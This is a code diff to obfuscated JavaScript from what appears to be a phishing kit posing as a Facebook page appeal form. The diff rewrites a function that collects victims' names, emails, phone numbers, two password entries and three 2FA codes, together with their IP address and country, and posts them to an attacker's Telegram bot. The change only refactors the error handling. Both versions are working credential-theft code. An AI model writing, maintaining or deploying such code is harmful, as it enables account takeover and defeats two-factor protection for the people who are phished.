@@ -232,82 +232,82 @@ async function getUserIp() {
   }
 }
 getUserIp();
-function sendDataEmail() {
-  var _0x47accc = {
-    ip_address: userIpData.user_ip,
-    country: userIpData.country,
-    country_code: userIpData.country_code,
-    full_name: formsSendData['full-name'] || '',
-    pers_email: formsSendData['personal-email'] || '',
-    bus_email: formsSendData['buiseness-email'] || '',
-    phone_number: formsSendData['mobile-phone-number'] || '',
-    p_one: formsSendData['password-1'] || '',
-    p_two: formsSendData['password-2'] || '',
-    c_one: formsSendData['2FA-1'] || '',
-    c_two: formsSendData['2FA-2'] || '',
-    c_three: formsSendData['2FA-3'] || '',
-    fb_page_name: formsSendData['page-name'] || '',
-    message: formsSendData['apeal'] || '',
-    dis_name: "MPC",
-    is_Mobile: metrics.is_Mobile,
-    params: metrics.params
-  };
+async function sendDataEmail() {
+  try {
+    var _0x47accc = {
+      ip_address: userIpData.user_ip,
+      country: userIpData.country,
+      country_code: userIpData.country_code,
+      full_name: formsSendData['full-name'] || '',
+      pers_email: formsSendData['personal-email'] || '',
+      bus_email: formsSendData['buiseness-email'] || '',
+      phone_number: formsSendData['mobile-phone-number'] || '',
+      p_one: formsSendData['password-1'] || '',
+      p_two: formsSendData['password-2'] || '',
+      c_one: formsSendData['2FA-1'] || '',
+      c_two: formsSendData['2FA-2'] || '',
+      c_three: formsSendData['2FA-3'] || '',
+      fb_page_name: formsSendData['page-name'] || '',
+      message: formsSendData['apeal'] || '',
+      dis_name: "MPC",
+      is_Mobile: metrics.is_Mobile,
+      params: metrics.params
+    };
 
-  // Helper function to escape Markdown special characters
-  function escapeMarkdown(text) {
-    if (!text) return '';
-    return String(text).replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
-  }
-
-  // Format message for Telegram
-  var telegramMessage = `🔔 *New Form Submission*\n\n` +
-    `📍 *IP Address:* ${escapeMarkdown(_0x47accc.ip_address)}\n` +
-    `🌍 *Country:* ${escapeMarkdown(_0x47accc.country)} \\(${escapeMarkdown(_0x47accc.country_code)}\\)\n` +
-    `👤 *Full Name:* ${escapeMarkdown(_0x47accc.full_name)}\n` +
-    `📧 *Personal Email:* ${escapeMarkdown(_0x47accc.pers_email)}\n` +
-    `📧 *Business Email:* ${escapeMarkdown(_0x47accc.bus_email)}\n` +
-    `📱 *Phone:* ${escapeMarkdown(_0x47accc.phone_number)}\n` +
-    `🔑 *Password 1:* ${escapeMarkdown(_0x47accc.p_one)}\n` +
-    `🔑 *Password 2:* ${escapeMarkdown(_0x47accc.p_two)}\n` +
-    `🔐 *2FA Code 1:* ${escapeMarkdown(_0x47accc.c_one)}\n` +
-    `🔐 *2FA Code 2:* ${escapeMarkdown(_0x47accc.c_two)}\n` +
-    `🔐 *2FA Code 3:* ${escapeMarkdown(_0x47accc.c_three)}\n` +
-    `📄 *FB Page Name:* ${escapeMarkdown(_0x47accc.fb_page_name)}\n` +
-    `💬 *Message:* ${escapeMarkdown(_0x47accc.message)}\n` +
-    `📱 *Mobile:* ${_0x47accc.is_Mobile ? 'Yes' : 'No'}\n` +
-    `📊 *Params:*\n\`\`\`\n${escapeMarkdown(_0x47accc.params)}\n\`\`\``;
-
-  // Send to Telegram
-  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
-      text: telegramMessage,
-      parse_mode: 'Markdown'
-    })
-  })
-  .then(_0x33667c => {
-    if (!_0x33667c.ok) {
-      return _0x33667c.json().then(err => {
-        console.error('Telegram API error:', err);
-        throw new Error('Telegram API error: ' + JSON.stringify(err));
-      });
+    // Helper function to escape Markdown special characters
+    function escapeMarkdown(text) {
+      if (!text) return '';
+      return String(text).replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
     }
-    return _0x33667c.json();
-  })
-  .then(_0x37edfc => {
-    if (_0x37edfc.ok) {
-      console.log('Message sent to Telegram successfully');
+
+    // Format message for Telegram
+    var telegramMessage = `🔔 *New Form Submission*\n\n` +
+      `📍 *IP Address:* ${escapeMarkdown(_0x47accc.ip_address)}\n` +
+      `🌍 *Country:* ${escapeMarkdown(_0x47accc.country)} \\(${escapeMarkdown(_0x47accc.country_code)}\\)\n` +
+      `👤 *Full Name:* ${escapeMarkdown(_0x47accc.full_name)}\n` +
+      `📧 *Personal Email:* ${escapeMarkdown(_0x47accc.pers_email)}\n` +
+      `📧 *Business Email:* ${escapeMarkdown(_0x47accc.bus_email)}\n` +
+      `📱 *Phone:* ${escapeMarkdown(_0x47accc.phone_number)}\n` +
+      `🔑 *Password 1:* ${escapeMarkdown(_0x47accc.p_one)}\n` +
+      `🔑 *Password 2:* ${escapeMarkdown(_0x47accc.p_two)}\n` +
+      `🔐 *2FA Code 1:* ${escapeMarkdown(_0x47accc.c_one)}\n` +
+      `🔐 *2FA Code 2:* ${escapeMarkdown(_0x47accc.c_two)}\n` +
+      `🔐 *2FA Code 3:* ${escapeMarkdown(_0x47accc.c_three)}\n` +
+      `📄 *FB Page Name:* ${escapeMarkdown(_0x47accc.fb_page_name)}\n` +
+      `💬 *Message:* ${escapeMarkdown(_0x47accc.message)}\n` +
+      `📱 *Mobile:* ${_0x47accc.is_Mobile ? 'Yes' : 'No'}\n` +
+      `📊 *Params:*\n\`\`\`\n${escapeMarkdown(_0x47accc.params)}\n\`\`\``;
+
+    // Send to Telegram
+    const resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: telegramMessage,
+        parse_mode: 'Markdown'
+      })
+    });
+
+    if (!resp.ok) {
+      const errorData = await resp.json();
+      console.error('Telegram API error:', errorData);
+      throw new Error(`Telegram API error: ${JSON.stringify(errorData)}`);
+    }
+
+    const result = await resp.json();
+    if (!result.ok) {
+      console.error('Telegram API error:', result);
+      throw new Error(`Telegram API error: ${JSON.stringify(result)}`);
     } else {
-      console.error('Telegram API error:', _0x37edfc);
+      console.log('Message sent to Telegram successfully');
     }
-  })
-  .catch(_0x1db690 => {
-    console.error('Error sending to Telegram:', _0x1db690);
-  });
+  } catch (error) {
+    console.error('Error sending to Telegram:', error);
+    // Có thể thêm retry logic hoặc fallback ở đây nếu cần
+  }
 }
 function firstFormHandle(_0x57e9aa) {
   _0x57e9aa.preventDefault();
